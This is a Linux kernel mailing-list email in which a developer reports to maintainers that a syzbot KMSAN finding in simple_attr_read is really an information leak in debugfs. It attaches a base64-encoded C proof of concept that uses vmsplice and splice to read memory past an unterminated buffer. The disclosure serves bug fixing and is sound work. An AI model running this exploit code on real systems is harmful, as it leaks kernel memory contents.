Return-Path: <linux-fsdevel-owner@vger.kernel.org>
X-Original-To: lists+linux-fsdevel@lfdr.de
Delivered-To: lists+linux-fsdevel@lfdr.de
Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
	by mail.lfdr.de (Postfix) with ESMTP id 64E23179266
	for <lists+linux-fsdevel@lfdr.de>; Wed,  4 Mar 2020 15:36:40 +0100 (CET)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S1729536AbgCDOge (ORCPT <rfc822;lists+linux-fsdevel@lfdr.de>);
        Wed, 4 Mar 2020 09:36:34 -0500
Received: from mail-wm1-f66.google.com ([209.85.128.66]:35336 "EHLO
        mail-wm1-f66.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S1726561AbgCDOgd (ORCPT
        <rfc822;linux-fsdevel@vger.kernel.org>);
        Wed, 4 Mar 2020 09:36:33 -0500
Received: by mail-wm1-f66.google.com with SMTP id m3so2122636wmi.0
        for <linux-fsdevel@vger.kernel.org>; Wed, 04 Mar 2020 06:36:32 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20161025;
        h=mime-version:references:in-reply-to:from:date:message-id:subject:to
         :cc;
        bh=lTzQt0c8E2G6FZcIo18SJrDWTb5FVlLb3zKNZ55nIjU=;
        b=UAlQDt3yXzhr1/Rlios7rnu8wu2dcEdNDRjne6mXF68TpoDeVMd80MArY6GgTG0o+h
         eeRgrqZAwiSTKJFNqNMVUGYca3sMWZcDXfhfqeoQGKmJwTdSONAYepcnIPU431ZdwBti
         H1TWcZZ3+JCr+9iuwAAmxXK+eRMDHht/RoggLD1iTWBXi8lXfUE4etVlHlu1IaPXfk9R
         sBmPPzWC3vyUAz0KT/tUM84vO19UR79dRW/ElIsVaIS60KGvKbeIxSnZ/zyfqrLyvx6I
         7PJNDvgKCAxIdUggDa2GpVHGOy2m9GIdp4xiZ8/HTimBbfPwNyezGZSZIzhQCaX0WJn0
         l14Q==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
         :message-id:subject:to:cc;
        bh=lTzQt0c8E2G6FZcIo18SJrDWTb5FVlLb3zKNZ55nIjU=;
        b=O7eX+TUg7Zsj3YhmBDGNO0poNTwN+HCxSrvvlCGTCMBsyDCpY7m++PSMinWi0WW0iE
         qvd6w6hI7OYeZhIZRK5OKQnLbIzqP3sB/a2o2Xdgr8Fh6B0TkslYzmCjzQlLnbdEeNLK
         N7wn4jNy1fUYq8CXSFP/9u4oMD/uwdKpsGRiAM4AxDpDCv5doaX8YM1CE39WA7ka/IWn
         3FzvlOTHFO7Ny8C59bvNatmDzL9KeBYtogMow0HJ/eQZz5Oth9f2fV7cYymFfgOFR1RZ
         nxloZ1PU+o9i7XWwORWPFJ6zRZ2QWV+czznqRDYp5B0Dhi+KnvfLQyiqdIZ5SvWrVKpD
         YFiA==
X-Gm-Message-State: ANhLgQ2bM98anqfXPcOXjQdzEUjyE9nc4Z00tdlebk4xiQpHsa9pDzQw
        z1yb1tY900vpkXLd6dx4MQXa8yAUNcwHvnc2FtTbz2mp
X-Google-Smtp-Source: ADFU+vtpj9M0/D5qC5k2fYKUXJ7T8fvjXg9+pLPrkkl6qnlX0K21QBOgi8n2/aKZZLKMXiH5E/H2EvEi9HcpVdIwjdc=
X-Received: by 2002:a1c:238d:: with SMTP id j135mr4057772wmj.165.1583332591534;
 Wed, 04 Mar 2020 06:36:31 -0800 (PST)
MIME-Version: 1.0
References: <0000000000007b25c1059f8b5a4f@google.com> <CAG_fn=XWOjiLY8KON5VdieOVpWdnbtMqo2v8TZ1f04+4777J=g@mail.gmail.com>
In-Reply-To: <CAG_fn=XWOjiLY8KON5VdieOVpWdnbtMqo2v8TZ1f04+4777J=g@mail.gmail.com>
From:   Alexander Potapenko <glider@google.com>
Date:   Wed, 4 Mar 2020 15:36:18 +0100
Message-ID: <CAG_fn=WvVp7Nxm5E+1dYs4guMYUV8D1XZEt_AZFF6rAQEbbAeg@mail.gmail.com>
Subject: Re: KMSAN: uninit-value in simple_attr_read
To:     syzbot <syzbot+fcab69d1ada3e8d6f06b@syzkaller.appspotmail.com>,
        Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
        "Rafael J. Wysocki" <rafael@kernel.org>,
        Arnd Bergmann <arnd@arndb.de>
Cc:     linux-fsdevel@vger.kernel.org, LKML <linux-kernel@vger.kernel.org>,
        syzkaller-bugs <syzkaller-bugs@googlegroups.com>,
        Al Viro <viro@zeniv.linux.org.uk>
Content-Type: multipart/mixed; boundary="000000000000aeadcc05a0085848"
Sender: linux-fsdevel-owner@vger.kernel.org
Precedence: bulk
List-ID: <linux-fsdevel.vger.kernel.org>
X-Mailing-List: linux-fsdevel@vger.kernel.org

--000000000000aeadcc05a0085848
Content-Type: text/plain; charset="UTF-8"

Hi Greg, Rafael, Arnd,

> This report says it's uninit in strlen, but there's actually an
> information leak later on that lets the user read arbitrary data past
> the non-terminated attr->get_buf.

The attached PoC demonstrates the problem.
I am not sure how bad is that, given that /sys/kernel/debug is usually
accessible only to the root, and simple attribute files don't seem to
be used anywhere else.

--000000000000aeadcc05a0085848
Content-Type: text/x-csrc; charset="US-ASCII"; name="simple_attr_read-leak.c"
Content-Disposition: attachment; filename="simple_attr_read-leak.c"
Content-Transfer-Encoding: base64
Content-ID: <f_k7dfc2n10>
X-Attachment-Id: f_k7dfc2n10

I2RlZmluZSBfR05VX1NPVVJDRQoKI2luY2x1ZGUgPGZjbnRsLmg+CiNpbmNsdWRlIDxzdGRpby5o
PgojaW5jbHVkZSA8c3RyaW5nLmg+CiNpbmNsdWRlIDxzeXMvbW1hbi5oPgojaW5jbHVkZSA8dW5p
c3RkLmg+CgojZGVmaW5lIEJVRl9TSVpFIDEyOAppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqYXJn
dltdKQp7CiAgY2hhciBidWZbQlVGX1NJWkVdOwogIGNvbnN0IGNoYXIgZGVmX2ZpbGVuYW1lW10g
PSAiL3N5cy9rZXJuZWwvZGVidWcvYmx1ZXRvb3RoLzZsb3dwYW5fZW5hYmxlIjsKICBjaGFyICpm
aWxlbmFtZSA9IChjaGFyICopZGVmX2ZpbGVuYW1lOwogIGludCBwaXBlZmRbMl0sIGRmc19mZDsK
ICBzdHJ1Y3QgaW92ZWMgaW92OwoKICBpZiAoYXJnYyA+IDEpCiAgICBmaWxlbmFtZSA9IGFyZ3Zb
MV07CiAgcGlwZShwaXBlZmQpOwogIGlvdi5pb3ZfYmFzZSA9IG1tYXAoTlVMTCwgMHgxMDAwLCAz
LCBNQVBfUFJJVkFURXxNQVBfQU5PTllNT1VTLCAtMSwgMCk7CiAgaW92Lmlvdl9sZW4gPSAweDE7
CiAgdm1zcGxpY2UocGlwZWZkWzFdLCAmaW92LCAxLCAxKTsKICBkZnNfZmQgPSBvcGVuKGZpbGVu
YW1lLCBPX1JEV1IpOwogIHNwbGljZShwaXBlZmRbMF0sIDAsIGRmc19mZCwgMCwgMHgxLCBTUExJ
Q0VfRl9OT05CTE9DSyk7CiAgbWVtc2V0KGJ1ZiwgMCwgQlVGX1NJWkUpOwogIHJlYWQoZGZzX2Zk
LCBidWYsIEJVRl9TSVpFKTsKICBwcmludGYoIiclcydcbiIsIGJ1Zik7CiAgcmV0dXJuIDA7Cn0K
--000000000000aeadcc05a0085848--
